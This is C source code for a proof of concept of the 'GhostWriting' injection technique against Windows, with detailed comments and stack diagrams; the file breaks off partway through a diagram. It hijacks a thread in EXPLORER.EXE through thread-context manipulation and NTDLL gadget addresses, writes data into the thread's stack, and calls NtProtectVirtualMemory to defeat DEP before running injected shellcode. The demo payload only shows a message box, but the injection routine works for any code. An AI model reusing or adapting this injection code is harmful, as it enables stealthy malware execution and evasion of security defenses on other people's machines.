//////
// Proof Of Concept for GhostWriting technique by c0de90e7.    Spring '2007
//
//

#include <windows.h>

HWND STDCALL GetShellWindow(void);

// Machine code bytes that we will inject into EXPLORER.EXE. When this snippet
// gets executed, it will launch a MessageBox and then return to the address
// indicated in ESI register. ESI will point to a EBFE ( JMP $ ) found into
// NTDLL.DLL, so the hijacked thread will enter an auto-lock state after the
// user clicks OK in this MessageBox.
UCHAR InjectionCode[]={	0x6A,0x00,					// PUSH 0
						0xE8,0x0D,0x00,0x00,0x00,	// CALL NEXT
						// Caption text
						'G','h','o','s','t','W','r','i','t','i','n','g',0x00,
						0xE8,0x1D,0x00,0x00,0x00,	// CALL NEXT
						// Message text
						'R','u','n','n','i','n','g',' ','i','n','t','o',' ','E','X','P','L','O','R','E','R','.','E','X','E','.','.','.',0x00,
						0x6A,0x00,					// PUSH 0
						0x56,						// PUSH ESI			; ( return address where MessageBoxA should return, we will set ESI so that in points to a EBFE )
						0x68,0x00,0x00,0x00,0x00,	// PUSH MessageBoxA	; ( we will change those 00s to MessageBoxA address in runtime )
						0xC3 };						// RET

// This routine will set thread's context to the values we want and wait till
// thread's EIP reaches a point we indicate. For this proof of concept, we
// will also post some GUI messages to the hijacked thread, so that thread's
// common "wait for messages" nature doesn't slow things down.
//
void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext,HWND ThreadsWindow,DWORD AutoLockTargetEIP)
{
	SetThreadContext(Thread,PThreadContext);

	PostMessage(ThreadsWindow,WM_USER,0,0);
	PostMessage(ThreadsWindow,WM_USER,0,0);
	PostMessage(ThreadsWindow,WM_USER,0,0);

	do
	{
		ResumeThread(Thread);
		Sleep(30);    // This could also be Sleep(0) ( Yield, as NtYieldExecution would do ), but in some cases ( windows server versions ) this would
		// lead to slowdowns or even starvation of the hijacked thread's execution. I have not done further research into this matter, but
		// I think this is due to the fact that those server versions of windows prioritize non-GUI thread's execution over GUI thread's
		// execution by default.

		SuspendThread(Thread);
		GetThreadContext(Thread,PThreadContext);
	}
	while(PThreadContext->Eip!=AutoLockTargetEIP);
}

// This routine will disassemble a possible "MOV [REG1],REG2" or "MOV [REG1+xx],REG2" instruction and validate its REG1 and REG2 registers so that:
//  a) They are EBX, EBP, ESI or EDI. We need them to be one of those, since they are the only stable ones when it comes to setting thread's context.
//  b) They are not the same ( REG1!=REG2 ). We need them to be different because we will use REG1 to point to memory and REG2 to write a DWORD.
//
int DisassembleAndValidateMOV(PUCHAR InstructionMemoryBase,ULONG* InstructionMemoryIndex,CONTEXT* PThreadContextBase,DWORD** WritePointer,DWORD** WriteItem,int* MOVRETOffsetFromMemoryRegister)
{
	UCHAR WritePointerRegIndex,WriteItemRegIndex,ModRM;
	DWORD* ArrayOfValidRegisterAddressesInContext[8];

	// Valid register addresses ( non-volatile ones ). NOTE, ESP is not volatile, but we will not be using it either.
	ArrayOfValidRegisterAddressesInContext[0]=NULL;    // EAX, not valid.
	ArrayOfValidRegisterAddressesInContext[1]=NULL;    // ECX, not valid.
	ArrayOfValidRegisterAddressesInContext[2]=NULL;    // EDX, not valid.
	ArrayOfValidRegisterAddressesInContext[3]=&PThreadContextBase->Ebx;    // EBX, valid, non-volatile, stable for setting it with SetThreadContext.
	ArrayOfValidRegisterAddressesInContext[4]=NULL;    // ESP, valid, but we will not use it.
	ArrayOfValidRegisterAddressesInContext[5]=&PThreadContextBase->Ebp;    // EBX, valid, non-volatile, stable for setting it with SetThreadContext.
	ArrayOfValidRegisterAddressesInContext[6]=&PThreadContextBase->Esi;    // ESI, valid, non-volatile, stable for setting it with SetThreadContext.
	ArrayOfValidRegisterAddressesInContext[7]=&PThreadContextBase->Edi;    // EDI, valid, non-volatile, stable for setting it with SetThreadContext.

	if(InstructionMemoryBase[*InstructionMemoryIndex]==0x89)    // Is it a "MOV /r" instruction ?
	{
		ModRM=InstructionMemoryBase[*InstructionMemoryIndex+1];    // if it is, we pick next byte, ModRM. We will split it into Mod,dstRM,srcRM.

		if((ModRM&0x80)!=0)    // We need Mod field to be 00 or 01.
			return FALSE;

		WritePointerRegIndex=ModRM&0x07;    // We pick dstRM ( destination register ).
		WriteItemRegIndex=(ModRM>>3)&0x07;    // We pick srcRM ( source register ).

		if(WritePointerRegIndex==WriteItemRegIndex)    // condition "b)", we need source and destination registers to be different REG1!=REG2.
			return FALSE;

		if((ModRM&0x40)==0)    // if Mod field is 00, it is a "MOV [REG1],REG2" instruction. Otherwise, if it is 01, it is a "MOV [REG1+xx],REG2".
		{    // Mod == 00    =>    "MOV [REG1],REG2"
			if(WritePointerRegIndex==5)    // This is a sub-case of "MOV [REG1],REG2" that has to be discarded. When Mod is 00 and destination RM is
				return FALSE;            // 5 ( the value that would indicate EBP ), the instruction is not "MOV [EBP],REG2", it turns out to be
			// "MOV [immediate32],REG2" instead. That immediate32 is a 32 bit address that gets encoded just after
			// this ModRM byte ( 89 RM YY YY YY YY, or 89, ModRM byte, immediate32 DWORD ).

			*MOVRETOffsetFromMemoryRegister=0;    // See Inject routine. This variable will hold the displacement over REG1 register. Since this is
			// is the case of a "MOV [REG1],REG2", there is no displacement over REG1, so we set it to 0.

			*InstructionMemoryIndex+=2;    // We increment the instruction memory index by 2, because that's the size of this instruction ( 89 RM ).
		}
		else
		{    // Mod == 01    =>    "MOV [REG1+xx],REG2"
			*MOVRETOffsetFromMemoryRegister=(signed char)InstructionMemoryBase[*InstructionMemoryIndex+2];    // In this case, that "xx" of the
			// instruction is a byte and gets
			// encoded just after the ModRM byte
			// ( 89 RM xx ). So we pick it from
			// instruction memory and set it to
			// this variable as a sign extended
			// byte.
			// NOTE: MOVRETOffsetFromMemoryRegister
			// is a 32 bit integer while this "xx"
			// found in the instruction is a 8 bit
			// integer, thats why we sign extend it
			// by that cast, otherwise, it would not
			// work properly in negative "xx" cases.

			*InstructionMemoryIndex+=3;    // As we have seen, the encoding of this case takes 3 bytes ( 89 RM xx ), so we increment instruction memory
			// index by 3.
		}

		// If the picked registers are valid ( not NULL ), we set them to WritePointer and WriteItem.
		if ((ArrayOfValidRegisterAddressesInContext[WritePointerRegIndex]!=NULL)&&(ArrayOfValidRegisterAddressesInContext[WriteItemRegIndex]!=NULL))
		{
			*WritePointer=ArrayOfValidRegisterAddressesInContext[WritePointerRegIndex];
			*WriteItem=ArrayOfValidRegisterAddressesInContext[WriteItemRegIndex];
		}
		else
			return FALSE;

		return TRUE;    // If we reach this point, all the needed requirements have been met.
	}
	else
		return FALSE;
}

// This is the core routine of this PoC. It will hijack a thread, inject code
// to it's stack ( although it could be anywhere... ) and finally run that code
// afterwards.
//
// NOTE: This function gets hijacked thread's handle, a pointer and a size of
// the code we want and what may seem lees obvious, a window handle owned by
// the hijacked thread. We will use that handle to call WaitForThreadAutoLock
// ( see WaitForThreadAutoLock ).
//
int Inject(HANDLE Thread,DWORD* InjectionCode,ULONG NumberOfDWORDsToInject,HWND ThreadsWindow)
{
	CONTEXT SavedThreadContext;    // This will hold the initial hijacked thread's register state, so that we can resume thread's execution in its
	// original state after we have finished our injection task.

	CONTEXT WorkingThreadContext;    // This one will hold hijacked thread's state while the thread is hijacked. We will do Get/SetThreadContexts as
	// many times as needed, that's what this technique is all about...

	DWORD* WritePointer;    // This two pointers will point into some fields into WorkingThreadContext in order to abstract the registers used in the
	DWORD* WriteItem;        // "MOV [REG1],REG2" instruction that the hijacked thread will be executing. See DisassembleAndValidateMOV routine.

	DWORD JMPTOSELFAddress,MOVRETAddress;    // This two are the addresses of a EBFE ( JMP $ ) and a "MOV [REG1],REG2"+"RET" respectively. We will find
	// them into NTDLL.DLL's code sections ( it could be into any module or even other places... ) and we will
	// divert hijacked thread's execution to them.

	int MOVRETOffsetFromMemoryRegister;    // See DisassembleAndValidateMOV, this variable holds the displacement over REG1 register found in instruction
	// "MOV [REG1],REG2" or "MOV [REG1+xx],REG2". If we find a "MOV [REG1],REG2", then this variable will be set
	// to 0, otherwise, if we find a  "MOV [REG1+xx],REG2", this variable will be set to that "xx" value.

	ULONG NumberOfBytesToPopAfterMOVBeforeRET;    // We will look for a pattern like this:
	// MOV [REG1],REG2
	// RET
	// But in order to be more flexible, since this pattern is not very common, we will also accept
	// patterns like this:
	// MOV [REG1],REG2
	// POP REGx
	// POP REGx
	// ...
	// RET
	// This pattern is far more common, it is indeed very common as function's epilogue.
	// So, in order to support working with this pattern, we need to control the amount of stack balancing
	// that will take place after that "MOV [REG1],REG2" and before that "RET". We will count the number of
	// POP instructions between the MOV and the RET and we will also accept "ADD REG,yy" instructions
	// ( which are very common instructions also ), and check if that REG is ESP, taking that "yy" into
	// account if that's the case.

	DWORD BASEOfWrittenBytes,DWORDWritingPointer;

	DWORD InjectedCodeExecutionStart;

	DWORD NtProtectVirtualMemoryAddress;    // This will hold the address of NtProtectVirtualMemory API into NTDLL.DLL. We will divert hijacked
	// thread's execution flow to that API in the last step of the injection, before actually executing the
	// injected code. The purpose of this step ( see next array also ) is to make our injected code bytes that
	// have been stored into hijacked thread's stack be PAGE_EXECUTE_READWRITE. By setting thread's EIP to the
	// NtProtectVirtualMemory API and setting thread's ESP to a copy of NtProtectVirtualMemoryCallFrame ( that
	// we will also inject to the hijacked thread's stack ), we will simulate a call as if the hijacked thread
	// itself did the call. This is based on common anti-DEP techniques theory used in some buffer overflow
	// exploitation for DEP enabled machines.

	DWORD NtProtectVirtualMemoryCallFrame[1+5+3]=    {    0,                        // return address that will point to JMPTOSELF

		0xFFFFFFFF,             // (pseudo)handle of current process
		0,                      // pointer that will point to base address of memory region (1)
		0,                      // pointer that will point to size of memory region (2)
		PAGE_EXECUTE_READWRITE,	// protection flags
		0,                      // pointer that will point to a DWORD where original protection flags will be stored (3)

		0,                      // [1] base address of the memory region where the protection flags are to be changed
		0,                      // [2] size of the memory region where the protection flags are to be changed
		0    };                 // [3] DWORD to get original protection flags

	HMODULE NTDLLBase;
	PUCHAR NTDLLCode;
	PIMAGE_NT_HEADERS NTDLLPEHeader;
	ULONG NTDLLCodeSize,i,j,k;

	NTDLLBase=GetModuleHandle("NTDLL.DLL");    // We get NTDLL.DLLs module base.
	NtProtectVirtualMemoryAddress=(DWORD)GetProcAddress(NTDLLBase,"NtProtectVirtualMemory");    // We solve NtProtectVirtualMemory API address.

	NTDLLCode=(PUCHAR)((ULONG)NTDLLBase+0x00001000);    // Assume first section starts at Base+1000h, and assume it is a code section...

	NTDLLPEHeader=(PIMAGE_NT_HEADERS)((ULONG)NTDLLBase+((IMAGE_DOS_HEADER*)NTDLLBase)->e_lfanew);    // We get total code size ( of all the code
	NTDLLCodeSize=NTDLLPEHeader->OptionalHeader.SizeOfCode;                                            // sections in NTDLL.DLL ). We also assume those
	// code sections are all contiguous...

	JMPTOSELFAddress=MOVRETAddress=(DWORD)NULL;

	i=0;

	while((i<NTDLLCodeSize)&&((!JMPTOSELFAddress)||(!MOVRETAddress)))    // While there is still machine code to look at and we have not found our
	{                                                                    // two needed patterns ( "JMP $" and "MOV [REG1],REG2"+"RET" ), keep searching
		if(!JMPTOSELFAddress)    // If we still have not found a "JMP $"
		{
			if((NTDLLCode[i]==0xEB)&&(NTDLLCode[i+1]==0xFE))    // check if we have that "JMP $" machine code at this point
			{
				JMPTOSELFAddress=(DWORD)&NTDLLCode[i];    // If we found it, store the address for later usage
				i+=1;    // and increment searching index
			}
		}

		if(!MOVRETAddress)    // If we still have not found a "MOV [REG1],REG2"+"RET"
		{    // check if it is a "MOV [REG1],REG2" or "MOV [REG1+xx],REG2". See DisassembleAndValidateMOV.
			if(DisassembleAndValidateMOV(NTDLLCode,&i,&WorkingThreadContext,&WritePointer,&WriteItem,&MOVRETOffsetFromMemoryRegister))
			{    // If the instruction was a valid ( see requirements criteria on DisassembleAndValidateMOV comments ) one,
				// we have i pointing to the next opcode bytes after that MOV, WritePointer and WriteItem pointing to the correct register fields into
				// WorkingThreadContext and MOVRETOffsetFromMemoryRegister set to the "xx" value in case the MOV instructions was "MOV [REG1+xx],REG2"

				j=i;
				k=0;

				while(j<i+16)    // in a 16 byte range after that MOV
				{
					if(((NTDLLCode[j]&0xF8)==0x58)&&(NTDLLCode[j]!=0x5C))    // we look for POP REGx instructions
					{
						k+=4;    // if that's the case, we increment ESP balancing counter for later calculations.
						j+=1;    // We increment this sub-search index
						continue;    // and we continue with a new instruction byte
					}

					if ((NTDLLCode[j]==0x83)&&((NTDLLCode[j+1]&0xF8)==0xC0))    // we look for ADD REGx,yy
					{
						if(NTDLLCode[j+1]==0xC4)    // if that REGx is ESP,
							k+=(signed char)NTDLLCode[j+2];    // we add yy amount of bytes to ESP balancing counter for later use

						j+=3;    // We increment this sub-search index
						continue;    // and we continue with a new instruction byte
					}

					if((NTDLLCode[j]==0xC3)||((NTDLLCode[j]==0xC2)&&(NTDLLCode[j+2]==0x00)))    // we look for a RET or RET n ( with n not above 255 )
					{                                                                            // if thats the case, we have found the second pattern
						// ( MOV + RET ).

						if(MOVRETOffsetFromMemoryRegister==0)    // if the MOV was a "MOV [REG1],REG2", then i variable was incremented by 2 ( the size
							MOVRETAddress=(DWORD)&NTDLLCode[i-2];    // of its machine code bytes ), so we set MOVRETAddress to NTDLLCode+i-2.
						else                                    // else, it was a "MOV [REG1+xx],REG2", so i variable was incremented by 3 ( the size
							MOVRETAddress=(DWORD)&NTDLLCode[i-3];    // of its machine code bytes ), so we set MOVRETAddress to NTDLLCode+i-3.

						NumberOfBytesToPopAfterMOVBeforeRET=k;    // we set this variable to the amount accumulated into k ( value that will be added to
						// ESP after the MOV gets executed and just before executing the RET ).

						i=j+3;    // we increment i so that it points ahead this pattern
						break;    // and we finish the subsearch
					}

					break;    // if we reach a instruction that is not a POP REGx or ADD REGx,yy, we finish this subsearch
				}
			}
		}

		i++;    // increment i and keep looking for any "JMP $" or "MOV + RET"...
	}

	if((JMPTOSELFAddress)&&(MOVRETAddress))    // If we found those required patterns... fun stuff starts ! ;D
	{
		SuspendThread(Thread);    // we suspend our victim thread, this is where the hijacking starts

		SavedThreadContext.ContextFlags=CONTEXT_FULL;
		WorkingThreadContext.ContextFlags=CONTEXT_FULL;

		GetThreadContext(Thread,&SavedThreadContext);    // we get and save initial thread's state for later restoring it
		GetThreadContext(Thread,&WorkingThreadContext);    // we get the same state again, but this time for messing with it

		// here we calculate the amount of thread's stack space we are going to need ( in order to write our injection bytes there )
		// the calculation is as follows:
		//
		//  INITIAL STACK STATUS                           NEW STACK STATUS
		//  ____________________                         ____________________
		// |                    |<--- Stack Bottom      |                    |<--- Stack Bottom
		// |                    |                       |                    |
		// |                    |                       |                    |
		// |                    |                       |                    |
		// |                    |                       |____________________|
		// |                    |                       |                    |<--- ESP ( and also BASEOfWrittenBytes )
		// |                    |                       |  RESERVED STACK    | ^
		// |                    |                       |  SPACE FOR OUR     | |
		// |                    |                       |  INJECTION         | |   NumberOfBytesToPopAfterMOVBeforeRET==variable        (1)
		// |                    |                       |                    | |                        +
		// |                    |                       |    RESERVED STACK  | |                 sizeof(DWORD)==4                       (2)
		// |                    |                       |     SPACE FOR OUR  | |                        +
		// |                    |                       |         INJECTION  | |  sizeof(NtProtectVirtualMemoryCallFrame)==4+20+12      (3)
		// |                    |                       |                    | |                        +
		// |                    |                       |  RESERVED STACK    | |   NumberOfDWORDsToInject*sizeof(DWORD)==variable       (4)
		// |                    |                       |  SPACE FOR OUR     | |
		// |                    |                       |  INJECTION         | |
		// |____________________|                       |____________________| v
		// |                    |<--- ESP               |                    |<--- Initial ESP
		// |  USED STACK SPACE  |                       |  USED STACK SPACE  |
		// |  USED STACK SPACE  |                       |  USED STACK SPACE  |
		// |  USED STACK SPACE  |                       |  USED STACK SPACE  |
		// |  USED STACK SPACE  |                       |  USED STACK SPACE  |
		// |  USED STACK SPACE  |                       |  USED STACK SPACE  |
		// |  USED STACK SPACE  |                       |  USED STACK SPACE  |
		// |  USED STACK SPACE  |                       |  USED STACK SPACE  |
		// |  USED STACK SPACE  |                       |  USED STACK SPACE  |
		// |____________________|<--- Stack Top         |____________________|<--- Stack Top
		//
		//
		//
		// [1] 0..N > Number of bytes reserved to hold arbitrary ( we just need the space to be there ) bytes, so that the "POP REGx" and/or "ADD REGx,yy"
		//            instructions we have found after the "MOV [REG1],REG2", increment ESP to fit into the next item.
		//
		// [2] 4    > This is the important one. DWORD sized space that will hold a return address. The RET instruction, which comes after the
		//            "MOV [REG1],REG2" and other possible "POP REGx" and/or "ADD REGx,yy" instructions, will pop this return address and divert
		//            execution of the thread to that address.
		//
		// [3] 36   > This will hold 9 DWORDs of a simulated stack frame for a call to NtProtectVirtualMemory API. 1 DWORD for a return address + 5 DWORDs
		//            for the 5 parameters that API function takes + 3 DWORDs for storing 3 local DWORDs that will be pointed to by 3 out of those 5
		//            parameters. Those 3 pointed parameters are output variables the API needs.
		//
		// [4]      > DWORD boundary aligned size of the machine code we are going to inject and later execute.
		//
		BASEOfWrittenBytes=WorkingThreadContext.Esp-((NumberOfDWORDsToInject*sizeof(DWORD))+((1+5+3)*sizeof(DWORD))+sizeof(DWORD)+NumberOfBytesToPopAfterMOVBeforeRET);

		//
		//  STACK STATUS
		//  ____________________
		// |                    |<--- Stack Bottom
		// |                    |
		// |                    |<--- ,*WritePointer ( REG1 ) == BASEOfWrittenBytes - MOVRETOffsetFromMemoryRegister + NumberOfBytesToPopAfterMOVBeforeRET (1)
		// |                    |   ,-| +
		// |                    |   | `MOVRETOffsetFromMemoryRegister ( 0 if using "MOV [REG1],REG2", xx if using "MOV [REG1+xx],REG2" )
		// |____________________|    `-------------------------------------.
		// |                    |<--- ,ESP == BASEOfWrittenBytes (2)       |
		// | dummy a            |   ,-| +                                  |
		// | dummy b            |   | `NumberOfBytesToPopAfterMOVBeforeRET |
		// | .                  |   |                                      |
		// | .                  |   |                                      |
		// | dummy z            |   |                                      |
		// |____________________|   |                                      |
		// | return address (3) |/<-´                                      |
		// |____________________|\<----------------------------------------´
		// |                    |
		// |                    |
		// |                    |                                            SOMEWHERE INTO NTDLL.DLL's CODE
		// |                    |                                            ________________________________________
		// |                    |              (3) EIP == MOVRETAddress --->|                                        |
		// |                    |                                           |  MOV [REG1],REG2 / MOV [REG1+xx],REG2  |
		// |                    |                                           |  ( POP REGx / ADD REGx,yy )            |
		// |                    |                                           |  .                                     |
		// |                    |                                           |  .                                     |
		// |                    |                                           |  RET / RET n                           |
		// |                    |                                           |________________________________________|
		// |                    |
		// |                    |
		// |                    |                                                     SOMEWHERE INTO NTDLL.DLL's CODE
		// |                    |                                                     _______________________________
		// |                    |    (4) *WriteItem ( REG2 ) == JMPTOSELFAddress --->|                               |
		// |                    |                                                    |  JMP $                        |
		// |                    |                                                    |_______________________________|
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- Initial ESP
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |____________________|<--- Stack Top
		//
		//

		// [1] WritePointer points to some register field into WorkingThreadContext ( REG1 in that "MOV [REG1],REG2", see DisassembleAndValidateMOV )
		//     and we set that chosen register's  value so that REG1+MOVRETOffsetFromMemoryRegister points to the same place where thread's ESP ( see
		//     [2], will have the same value as BASEOfWrittenBytes )+NumberOfBytesToPopAfterMOVBeforeRET points.
		*WritePointer=BASEOfWrittenBytes-MOVRETOffsetFromMemoryRegister+NumberOfBytesToPopAfterMOVBeforeRET;

		// [2] we set the new ESP, just the initial ESP minus the number of bytes needed for our injection
		WorkingThreadContext.Esp=BASEOfWrittenBytes;

		// [3] we divert thread's execution to one of the patterns we have found found: "MOV [REG1],REG2"+...+"RET".
		WorkingThreadContext.Eip=MOVRETAddress;

		// [4] WriteItem points to some register field into WorkingThreadContext ( REG2 in that "MOV [REG1],REG2", see DisassembleAndValidateMOV ) and
		//     we set its value so that it points to the other pattern we found: "JMP $".
		*WriteItem=JMPTOSELFAddress;

		// Now the trick itself: we let thread's execution continue ( see WaitForThreadAutoLock ) and wait till its EIP register gets a value of
		// JMPTOSELFAddress, this is what happens:
		//
		// a) The thread executes that "MOV [REG1],REG2" or "MOV [REG1+xx],REG2": since REG1 or REG1+xx point to a DWORD in stack which is going to be
		//    popped out as a return address, after this instruction gets executed, REG2's value will be stored in stack as a return address.
		// b) After that "MOV [REG1],REG2" or "MOV [REG1+xx],REG2", some "POP REGx" and/or "ADD REGx,yy" may come. Those are useless for our trick, we
		//    have just taken them into account for stack balancing calculations ( see NumberOfBytesToPopAfterMOVBeforeRET calculations in that while{}
		//    loop before ). So those "POP REGx" and/or "ADD REGx,yy" could make ESP advancements, but they are ok since we determined which value ESP
		//    will take before executing the next RET instruction.
		// c) After that set of "POP REGx" and/or "ADD REGx,yy" instructions, we reach a "RET" or "RET n" instruction, so ESP points to a return address
		//    and ( see "a)" ) that return address has REG2's value, which, if you look at [4] step before, points to a "JMP $" instruction. So after
		//    this "RET" or "RET n" executes, thread's execution will be diverted to a "JMP $", which, you can see that, makes the thread enter an
		//    auto-lock state.
		// d) This WaitForThreadAutoLock routine will eventually see how the hijacked thread's execution reached that auto-lock state ( I mean, EIP gets
		//    a value equal to JMPTOSLEFAddress ) and let us continue with our thread manipulation tasks... };>
		WaitForThreadAutoLock(Thread,&WorkingThreadContext,ThreadsWindow,JMPTOSELFAddress);

		// Ooookkaayyy, pretty complex thread manipulation but... what have we achieved so far ? Nothing... nothing ? Not yet, but keep going. This is
		// what we have achieved:
		//
		//
		//  STACK STATUS
		//  ____________________
		// |                    |<--- Stack Bottom
		// |                    |
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- BASEOfWrittenBytes
		// | dummy a            |
		// | dummy b            |
		// | .                  |
		// | .                  |
		// | dummy z            |
		// |____________________|
		// | JMPTOSELFAddress -------------------.
		// |____________________|                |
		// |                    |<--- ESP        |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |
		// |                    |                |                                    SOMEWHERE INTO NTDLL.DLL's CODE
		// |                    |                |                                    _______________________________
		// |                    |                |      EIP == JMPTOSELFAddress --->\|                               |
		// |                    |                `--------------------------------->/|  JMP $                        |
		// |                    |                                                    |_______________________________|
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- Initial ESP
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |____________________|<--- Stack Top
		//
		//
		// So... it may seem we have nothing here, but we do have something. That return address is now an address that points to "JMP $", this means
		// that, from now on, we can repeat the process as many times as we need/want and we no longer need REG1 to point to that return address and
		// we no longer need that REG2 to point to "JMP $" instruction. We must simply readjust thread's ESP to point to the same initial point we gave
		// it the previous time ( BASEOfWrittenBytes ) and readjust EIP so that it points to the same initial address of the previous time ( that is,
		// MOVRETAddress ). We can set REG1 to be "anywhere" and set REG2 to be "anything", so, from now on, we can write any DWORD to any place. Get
		// the idea ?

		// What comes next is a loop for writing 9 DWORDs that represent a simulated call frame to NtProtectVirtualMemory API. We will simulate a call
		// to this API in order to mark our injection memory ( a range of bytes into the region we reserved for the injection in the stack ) as
		// PAGE_EXECUTE_READWRITE, so that DEP ( Data Execution Prevention ) does not stop us from executing the injected code later on. Let's see
		// NtProtectVirtualMemory's C language prototype:
		//
		// NtProtectVirtualMemory(    IN HANDLE ProcessHandle,
		//                            IN OUT PVOID *BaseAddress,
		//                            IN OUT PULONG NumberOfBytesToProtect,
		//                            IN ULONG NewAccessProtection,
		//                            OUT PULONG OldAccessProtection );
		//
		// Okay, so, it takes 5 parameters, why 9 DWORDs then ?
		//
		// | SIMULATED RETADDR  |                (1) 1st DWORD: This will hold the address to where the API would return after doing its job,
		// | p.1: ProcessHandle |                2nd DWORD: This will hold 0xFFFFFFFF ( -1, current process, see NtProtectVirtualMemoryCallFrame ),
		// | p.2: &BaseAddress -----------.      (2) 3rd DWORD: We will make this have a pointer to the 7th DWORD,
		// | p.3: &NumBytesProt --------. |      (3) 4th DWORD: We will make this have a pointer to the 8th DWORD,
		// | p.4: NewAccessProt |       | |      5th DWORD: This will hold PAGE_EXECUTE_READWRITE ( see NtProtectVirtualMemoryCallFrame ),
		// | p.5: &OldAccessPrt ----.   | |      (4) 6th DWORD: We will make this have a pointer to the 9th DWORD,
		// | BaseAddress        |<--+---+-´      (5) 7th DWORD: We will make this to be a pointer to our injection's executable code ( put in the stack )
		// | NumBytesProt       |<--+---´        (6) 8th DWORD: We will make this to be the size of our injection's executable code.
		// | OldAccessPrt       |<--´            9th DWORD: We do not care about this, we just need to reserve the space...
		//

		// [1] We need to be able to synchronize the moment when NtProtectVirtualMemory finishes and make the thread stop there, so we set this DWORD to
		//     JMPTOSELFAddress ( address of "JMP $" instruction ).
		NtProtectVirtualMemoryCallFrame[0]=JMPTOSELFAddress;

		// [2] We make the 3rd DWORD point to the 7th DWORD, as we are going to write this 9 DWORD array to the stack, just after the return address
		//     we have been using in the previous step, we make the pointer calculations like this:
		//
		//     BASEOfWrittenBytes+NumberOfBytesToPopAfterMOVBeforeRET+sizeof(DWORD)+...
		//     BASE + skip dummy DWORDs that will be popped + skip return address+... ( those "..." are the BASE for this 9 DWORD array ).
		//
		// So in this case, to point to 7th DWORD, we need to skip those and then skip 1 more DWORD for the return address of this call frame plus 5
		// DWORDs for the 5 parameters.
		NtProtectVirtualMemoryCallFrame[2]=BASEOfWrittenBytes+NumberOfBytesToPopAfterMOVBeforeRET+sizeof(DWORD)+((1+5+0)*sizeof(DWORD));

		// [3] We make the 4th DWORD point to the 8th DWORD, we do it as we did it for [2], but we skip a DWORD more
		NtProtectVirtualMemoryCallFrame[3]=BASEOfWrittenBytes+NumberOfBytesToPopAfterMOVBeforeRET+sizeof(DWORD)+((1+5+1)*sizeof(DWORD));

		// [4] We make the 6th DWORD point to the 9th DWORD, we do it as we did it for [2], but we skip two more DWORDs
		NtProtectVirtualMemoryCallFrame[5]=BASEOfWrittenBytes+NumberOfBytesToPopAfterMOVBeforeRET+sizeof(DWORD)+((1+5+2)*sizeof(DWORD));

		// [5] This is not as the previous 3, this is not a parameter, it is a local variable, pointed by parameter 2 ( 3rd DWORD ). We make it point
		//     to a point in the stack where we will be injecting executable code. That point will be just after this 9 DWORD call frame, thats why
		//     we skip one more DWORD.
		NtProtectVirtualMemoryCallFrame[6]=BASEOfWrittenBytes+NumberOfBytesToPopAfterMOVBeforeRET+sizeof(DWORD)+((1+5+3)*sizeof(DWORD));

		// [6] We make 8th DWORD be the size that our injected executable code has
		NtProtectVirtualMemoryCallFrame[7]=NumberOfDWORDsToInject*sizeof(DWORD);

		// Here we write those 9 DWORDs into thread's stack space
		//
		//  STACK STATUS
		//  ____________________
		// |                    |<--- Stack Bottom
		// |                    |
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- ,ESP == BASEOfWrittenBytes
		// | dummy a            |   ,-| +
		// | dummy b            |   | `NumberOfBytesToPopAfterMOVBeforeRET
		// | .                  |   |
		// | .                  |   |
		// | dummy z            |   |                                                                              ( for i from 0 to 8 )---.
		// |____________________|   |                                                                                                      |
		// | JMPTORETAddress    |<--´                                         *WriteItem ( REG2 ) == NtProtectVirtualMemoryCallFrame[i]  <-|
		// |_______ | __________|    ,MOVRETOffsetFromMemoryRegister                                                                       |
		// |        |           |<---| -                                                                                                   |
		// |        |           | .  `*WritePointer ( REG1 ) == BASEOfWrittenBytes+NumberOfBytesToPopAfterMOVBeforeRET+sizeof(DWORD)+i*4 <-´
		// |        |           | .                                          SOMEWHERE INTO NTDLL.DLL's CODE
		// |        |           | .                                          ________________________________________
		// |        |           |                  EIP == MOVRETAddress --->|                                        |
		// |        |           |                                           |  MOV [REG1],REG2 / MOV [REG1+xx],REG2  |
		// |        |           |                                           |  ( POP REGx / ADD REGx,yy )            |
		// |        |           |                                           |  .                                     |
		// |        |           |                                           |  .                                     |
		// |        |           |                                           |  RET / RET n                           |
		// |        |           |                                           |________________________________________|
		// |        |           |
		// |        |           |
		// |        |           |                                                     SOMEWHERE INTO NTDLL.DLL's CODE
		// |        |           |                                                     _______________________________
		// |        `--------------------------------------------------------------->|                               |
		// |                    |                                                    |  JMP $                        |
		// |                    |                                                    |_______________________________|
		// |                    |
		// |                    |
		// |                    |
		// |____________________|
		// |                    |<--- Initial ESP
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |  USED STACK SPACE  |
		// |____________________|<--- Stack Top
		//
		//

		DWORDWritingPointer=BASEOfWrittenBytes+NumberOfBytesToPopAfterMOVBeforeRET+sizeof(DWORD);

		for(i=0;i<9;i++)
		{
			WorkingThreadContext.Esp=BASEOfWrittenBytes;
			*WritePointer=DWORDWritingPointer-MOVRETOffsetFromMemoryRegister;
			*WriteItem=NtProtectVirtualMemoryCallFrame[i];
			WorkingThreadContext.Eip=MOVRETAddress;

			WaitForThreadAutoLock(Thread,&WorkingThreadContext,ThreadsWindow,JMPTOSELFAddress);

			DWORDWritingPointer+=sizeof(DWORD);
		}

		// After this for executes, we have the NtProtectVirtualMemory call frame written to the hijacked thread's stack:
		//
		//
		//  STACK STATUS
		//  ____________________
		// |                    |<--- Stack Bottom
		// |                    |
		// |                    |
		// |                    |
